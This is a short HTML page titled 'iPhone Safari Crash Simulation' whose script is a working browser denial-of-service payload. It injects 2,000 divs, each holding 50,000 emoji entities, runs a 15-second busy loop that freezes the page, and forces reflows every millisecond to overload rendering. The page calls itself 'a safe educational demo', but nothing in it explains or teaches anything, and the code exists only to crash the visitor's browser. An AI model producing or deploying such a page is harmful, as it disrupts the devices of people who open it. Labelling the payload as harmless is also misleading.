<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>iPhone Safari Crash Simulation</title>
</head>
<body>
  <h1>Safari Crash Simulation</h1>
  <p>This is a safe educational demo that may cause Safari to close.</p>

  <script>
    // Unicode bomb string (safe but heavy for rendering)
    const bomb = "&#x1F4A5;".repeat(50000);

    // Create a large number of elements to overload rendering
    for (let i = 0; i < 2000; i++) {
      const div = document.createElement("div");
      div.innerHTML = bomb;
      document.body.appendChild(div);
    }

    // Heavy CPU loop to simulate processing load
    let start = Date.now();
    while (Date.now() - start < 15000) {
      Math.sqrt(Math.random() * 999999);
    }

    // Keep forcing reflows
    setInterval(() => {
      document.body.style.transform = `rotate(${Math.random()}deg)`;
    }, 1);
  </script>
</body>
</html>
